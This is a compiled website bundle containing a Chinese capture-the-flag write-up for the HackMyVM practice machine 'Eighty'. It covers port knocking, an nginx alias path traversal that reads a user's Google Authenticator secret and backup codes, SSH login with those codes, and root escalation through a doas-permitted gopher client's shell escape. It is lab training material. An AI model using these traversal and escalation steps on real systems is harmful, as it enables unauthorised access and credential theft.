"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[6001],{67201:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>c,contentTitle:()=>a,default:()=>d,frontMatter:()=>r,metadata:()=>l,toc:()=>h});var s=t(85893),i=t(11151);const r={},a="Eighty",l={id:"HackMyVM/Machines/Eighty/index",title:"Eighty",description:"[Linux VM] [Tested on VirtualBox] created by || sml",source:"@site/docs/HackMyVM/Machines/Eighty/index.md",sourceDirName:"HackMyVM/Machines/Eighty",slug:"/HackMyVM/Machines/Eighty/",permalink:"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Eighty/",draft:!1,unlisted:!1,editUrl:"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/HackMyVM/Machines/Eighty/index.md",tags:[],version:"current",frontMatter:{},sidebar:"HackMyVM_Sidebar",previous:{title:"Driftingblues3",permalink:"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Driftingblues3/"},next:{title:"Emma",permalink:"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Emma/"}},c={},h=[{value:"\u9776\u673a\u542f\u52a8",id:"\u9776\u673a\u542f\u52a8",level:2},{value:"nmap \u4fe1\u606f\u641c\u96c6",id:"nmap-\u4fe1\u606f\u641c\u96c6",level:2},{value:"web \u670d\u52a1 Port-70",id:"web-\u670d\u52a1-port-70",level:2},{value:"knock \u829d\u9ebb\u5f00\u95e8",id:"knock-\u829d\u9ebb\u5f00\u95e8",level:2},{value:"web \u670d\u52a1 Port-80",id:"web-\u670d\u52a1-port-80",level:2},{value:"web \u670d\u52a1 henry.eighty.hmv",id:"web-\u670d\u52a1-henryeightyhmv",level:2},{value:"web \u670d\u52a1 susan.eighty.hmv",id:"web-\u670d\u52a1-susaneightyhmv",level:2},{value:"User - susan",id:"user---susan",level:2},{value:"flag - user",id:"flag---user",level:3},{value:"\u73af\u5883\u63a2\u6d4b",id:"\u73af\u5883\u63a2\u6d4b",level:3},{value:"User - root",id:"user---root",level:2},{value:"flag - root",id:"flag---root",level:3}];function o(e){const n={admonition:"admonition",code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",p:"p",pre:"pre",...(0,i.a)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(n.h1,{id:"eighty",children:"Eighty"}),"\n",(0,s.jsxs)(n.admonition,{type:"note",children:[(0,s.jsx)(n.p,{children:"[Linux VM] [Tested on VirtualBox] created by || sml"}),(0,s.jsx)(n.p,{children:"\u23f2\ufe0f Release Date // 2021-04-08"}),(0,s.jsx)(n.p,{children:"\u2714\ufe0f MD5 // 08bd927e1e73f2a43008c1122838f481"}),(0,s.jsx)(n.p,{children:"\u2620 Root // 27"}),(0,s.jsx)(n.p,{children:"\ud83d\udc80 User // 28"}),(0,s.jsx)(n.p,{children:"\ud83d\udcddNotes //\nHack and fun."})]}),"\n",(0,s.jsx)(n.h2,{id:"\u9776\u673a\u542f\u52a8",children:"\u9776\u673a\u542f\u52a8"}),"\n",(0,s.jsx)(n.p,{children:"\u9776\u673a IP"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",children:"192.168.56.125\n"})}),"\n",(0,s.jsx)(n.h2,{id:"nmap-\u4fe1\u606f\u641c\u96c6",children:"nmap \u4fe1\u606f\u641c\u96c6"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",children:'Nmap scan report for 192.168.56.125\nHost is up (0.00051s latency).\nNot shown: 65532 closed tcp ports (reset)\nPORT   STATE    SERVICE VERSION\n22/tcp open     ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)\n| ssh-hostkey:\n|   2048 c9:ce:d7:2a:f9:48:25:65:a9:33:4b:d5:01:e1:2c:52 (RSA)\n|   256 7e:3d:4d:b4:82:0b:13:eb:db:50:e3:60:70:f0:4a:ad (ECDSA)\n|_  256 7f:9d:13:c8:7b:d9:37:1d:cb:ff:e9:ce:f5:90:c3:32 (ED25519)\n70/tcp open     http    pygopherd web-gopher gateway\n|_http-title: Gopher\n| gopher-ls:\n|_[txt] /howtoconnect.txt "Connection"\n'})}),"\n",(0,s.jsx)(n.h2,{id:"web-\u670d\u52a1-port-70",children:"web \u670d\u52a1 Port-70"}),"\n",(0,s.jsxs)(n.p,{children:["\u5728 70 \u7aef\u53e3\u5f00\u653e\u7684\u5b9e\u9645\u4e0a\u662f\u4e00\u4e2a gopher \u7684\u6b22\u8fce\u754c\u9762\uff0c\u540c\u65f6\u53d1\u73b0 nmap \u81ea\u52a8\u5316\u63a2\u6d4b\u53d1\u73b0\u4e00\u4e2a\u6587\u4ef6 ",(0,s.jsx)(n.code,{children:"/howtoconnect.txt"})]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",metastring:'title="192.168.56.125:70/howtoconnect.txt"',children:"Ping us to: 4767 2343 3142\n"})}),"\n",(0,s.jsxs)(n.p,{children:["\u6839\u636e\u5f97\u5230\u7684\u4fe1\u606f\uff0c\u6000\u7591\u662f ",(0,s.jsx)(n.code,{children:"knockd"})," \u7a0b\u5e8f\u6240\u76d1\u542c\u7684\u7aef\u53e3"]}),"\n",(0,s.jsx)(n.h2,{id:"knock-\u829d\u9ebb\u5f00\u95e8",children:"knock \u829d\u9ebb\u5f00\u95e8"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:'\u250c\u2500[randark@parrot]\u2500[~]\n\u2514\u2500\u2500\u257c $ knock 192.168.56.125 4767 2343 3142\n\u250c\u2500[randark@parrot]\u2500[~]\n\u2514\u2500\u2500\u257c $ np-tcp 192.168.56.125\nStarting Nmap 7.94SVN (https://nmap.org) at 2024-03-02 19:24 CST\nNmap scan report for 192.168.56.125\nHost is up (0.00052s latency).\nNot shown: 65532 closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)\n| ssh-hostkey:\n|   2048 c9:ce:d7:2a:f9:48:25:65:a9:33:4b:d5:01:e1:2c:52 (RSA)\n|   256 7e:3d:4d:b4:82:0b:13:eb:db:50:e3:60:70:f0:4a:ad (ECDSA)\n|_  256 7f:9d:13:c8:7b:d9:37:1d:cb:ff:e9:ce:f5:90:c3:32 (ED25519)\n70/tcp open  http    pygopherd web-gopher gateway\n| gopher-ls:\n|_[txt] /howtoconnect.txt "Connection"\n|_http-title: Gopher\n80/tcp open  http    nginx 1.14.2\n|_http-title: Site doesn\'t have a title (text/html).\n|_http-server-header: nginx/1.14.2\nMAC Address: 08:00:27:FB:B3:60 (Oracle VirtualBox virtual NIC)\nDevice type: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.8\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n'})}),"\n",(0,s.jsx)(n.p,{children:"\u53ef\u4ee5\u53d1\u73b0\uff0c\u6b64\u65f6\u5f00\u653e\u4e86\u4e00\u4e2a 80 \u7aef\u53e3\u7684 web \u670d\u52a1\u51fa\u6765"}),"\n",(0,s.jsx)(n.h2,{id:"web-\u670d\u52a1-port-80",children:"web \u670d\u52a1 Port-80"}),"\n",(0,s.jsx)(n.p,{children:"\u5c1d\u8bd5\u76ee\u5f55\u7206\u7834"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",children:"[19:28:13] 200 -   16B  - /index.html\n[19:28:28] 200 -   18B  - /robots.txt\n"})}),"\n",(0,s.jsxs)(n.p,{children:["\u67e5\u770b ",(0,s.jsx)(n.code,{children:"robots.txt"})," \u6587\u4ef6\u7684\u5185\u5bb9"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",children:"/nginx_backup.txt\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u7ee7\u7eed\u8ddf\u8fdb"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",metastring:'title="http://192.168.56.125/nginx_backup.txt"',children:"server {\n        listen 80 default_server;\n        listen [::]:80 default_server;\n        root /var/www/html;\n        index index.html index.htm index.nginx-debian.html;\n        server_name _;\n        location / {\n                try_files $uri $uri/ =404;\n        }\n}\n\nserver {\nserver_name henry.eighty.hmv;\nroot /var/www/html;\nindex index.html index.htm index.nginx-debian.html;\n        location /web {\n                alias /home/henry/web/;\n        }\n  }\n\nserver {\nserver_name susan.eighty.hmv;\nroot /var/www/html;\nindex index.html index.htm index.nginx-debian.html;\n        location /web {\n                alias /home/susan/web/;\n        }\n  }\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u53ef\u4ee5\u53d1\u73b0\uff0c\u8fd9\u662f\u4e00\u4e2a nginx \u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u5728\u5176\u4e2d\u53ef\u4ee5\u627e\u5230\u4ee5\u4e0b\u5730\u5740"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",children:"henry.eighty.hmv --\x3e /home/henry/web/\nsusan.eighty.hmv --\x3e /home/susan/web/\n"})}),"\n",(0,s.jsxs)(n.p,{children:["\u5c06\u4ee5\u4e0a\u7684\u5730\u5740\u6dfb\u52a0\u5230 ",(0,s.jsx)(n.code,{children:"/etc/hosts"})," \u6587\u4ef6\uff0c\u7136\u540e\u7ee7\u7eed\u8ddf\u8fdb"]}),"\n",(0,s.jsx)(n.h2,{id:"web-\u670d\u52a1-henryeightyhmv",children:"web \u670d\u52a1 henry.eighty.hmv"}),"\n",(0,s.jsxs)(n.p,{children:["\u76f4\u63a5\u8bbf\u95ee ",(0,s.jsx)(n.code,{children:"/web"})," \u8def\u7531"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",children:"Henry Webpage\n\nTest\ntest\ntes\nTest\ntest\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u5c1d\u8bd5\u76ee\u5f55\u7206\u7834\uff0c\u672a\u53d1\u73b0\u6709\u4ef7\u503c\u4fe1\u606f"}),"\n",(0,s.jsx)(n.h2,{id:"web-\u670d\u52a1-susaneightyhmv",children:"web \u670d\u52a1 susan.eighty.hmv"}),"\n",(0,s.jsxs)(n.p,{children:["\u76f4\u63a5\u8bbf\u95ee ",(0,s.jsx)(n.code,{children:"/web"})," \u8def\u7531"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",children:"Susan Webpage\n\x3c!-- Work in progress --\x3e\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u5c1d\u8bd5\u76ee\u5f55\u7206\u7834"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",children:"/index.html           (Status: 200) [Size: 40]\n/lostpasswd.txt       (Status: 200) [Size: 50]\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u8bbf\u95ee\u8fd9\u4e2a\u6587\u4ef6"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",metastring:'title="http://susan.eighty.hmv/web/lostpasswd.txt"',children:"8ycrois-tu0 + /home/susan/secret/.google-auth.txt\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u540c\u65f6\uff0c\u7ed3\u5408\u4e0a\u6587\u5f97\u5230\u7684 nginx \u914d\u7f6e\u6587\u4ef6"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",children:"server {\nserver_name susan.eighty.hmv;\nroot /var/www/html;\nindex index.html index.htm index.nginx-debian.html;\n        location /web {\n                alias /home/susan/web/;\n        }\n  }\n"})}),"\n",(0,s.jsxs)(n.p,{children:["\u7531\u4e8e\u914d\u7f6e\u6587\u4ef6\u7684 ",(0,s.jsx)(n.code,{children:"location"})," \u90e8\u5206\u6ca1\u6709\u95ed\u5408\uff0c\u5bfc\u81f4\u53ef\u4ee5\u5b9e\u73b0\u8def\u5f84\u7a7f\u8d8a"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",metastring:'title="http://susan.eighty.hmv/web../secret/.google-auth.txt"',children:'2GN7KARBONVR55R7SP3UZPN3ZM\n" RATE_LIMIT 3 30\n" WINDOW_SIZE 17\n" DISALLOW_REUSE\n" TOTP_AUTH\n71293338\n48409754\n27074208\n60216448\n17908010\n'})}),"\n",(0,s.jsx)(n.h2,{id:"user---susan",children:"User - susan"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500[randark@parrot]\u2500[~]\n\u2514\u2500\u2500\u257c $ ssh susan@192.168.56.125\n(susan@192.168.56.125) Password: ** 8ycrois-tu0 **\n(susan@192.168.56.125) Verification code: ** 71293338 **\nLinux eighty 4.19.0-14-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30) x86_64\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nLast login: Sat Mar  2 07:01:10 2024 from 192.168.56.102\nsusan@eighty:~$ whoami\nsusan\n"})}),"\n",(0,s.jsx)(n.admonition,{type:"note",children:(0,s.jsx)(n.p,{children:"\u7531\u4e8e\u91c7\u7528\u7684\u662f Auth \u7ed3\u6784\uff0c\u6240\u4ee5\u4e0a\u6587\u63d0\u4f9b\u7684\u90a3\u4e9b Verification code \u90fd\u662f\u53ef\u4ee5\u7528\u7684"})}),"\n",(0,s.jsx)(n.h3,{id:"flag---user",children:"flag - user"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"susan@eighty:~$ cat user.txt\nhmv8use0red\n"})}),"\n",(0,s.jsx)(n.h3,{id:"\u73af\u5883\u63a2\u6d4b",children:"\u73af\u5883\u63a2\u6d4b"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",metastring:'title="find / -perm -u=s -type f 2>/dev/null"',children:"/usr/local/bin/doas\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/eject/dmcrypt-get-device\n/usr/lib/openssh/ssh-keysign\n/usr/bin/chfn\n/usr/bin/gpasswd\n/usr/bin/passwd\n/usr/bin/umount\n/usr/bin/su\n/usr/bin/newgrp\n/usr/bin/chsh\n/usr/bin/mount\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u53d1\u73b0\u5b58\u5728 doas \u7a0b\u5e8f\uff0c\u8bfb\u53d6\u5176\u914d\u7f6e\u6587\u4ef6"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",metastring:'title="/usr/local/etc/doas.conf"',children:"permit nolog susan as root cmd gopher\n"})}),"\n",(0,s.jsx)(n.h2,{id:"user---root",children:"User - root"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"susan@eighty:~$ doas -u root gopher localhost 70\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u6267\u884c\u8fd9\u6761\u6307\u4ee4\u4e4b\u540e\uff0c\u8f93\u5165\u7528\u6237\u5bc6\u7801\uff0c\u5c31\u80fd\u4ee5 root \u7684\u8eab\u4efd\u6267\u884c gopher \u7a0b\u5e8f\uff0c\u5e94\u8be5\u80fd\u591f\u770b\u5230\u4ee5\u4e0b\u754c\u9762"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{alt:"img",src:t(24998).Z+"",width:"2560",height:"1551"})}),"\n",(0,s.jsxs)(n.p,{children:["\u63a5\u4e0b\u6765\uff0c\u6309\u4e0b ",(0,s.jsx)(n.code,{children:"!"})," \u952e\uff0c\u5373\u53ef\u8fdb\u5165 shell"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"root@eighty:/home/susan# whoami\nroot\n"})}),"\n",(0,s.jsx)(n.h3,{id:"flag---root",children:"flag - root"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"root@eighty:~# cat r0ot.txt\nrooted80shmv\n"})})]})}function d(e={}){const{wrapper:n}={...(0,i.a)(),...e.components};return n?(0,s.jsx)(n,{...e,children:(0,s.jsx)(o,{...e})}):o(e)}},24998:(e,n,t)=>{t.d(n,{Z:()=>s});const s=t.p+"assets/images/image_20240332-203205-e1a561b241b14baa32d6f4424c7ff63a.png"},11151:(e,n,t)=>{t.d(n,{Z:()=>l,a:()=>a});var s=t(67294);const i={},r=s.createContext(i);function a(e){const n=s.useContext(r);return s.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function l(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:a(e.components),s.createElement(r.Provider,{value:n},e.children)}}}]);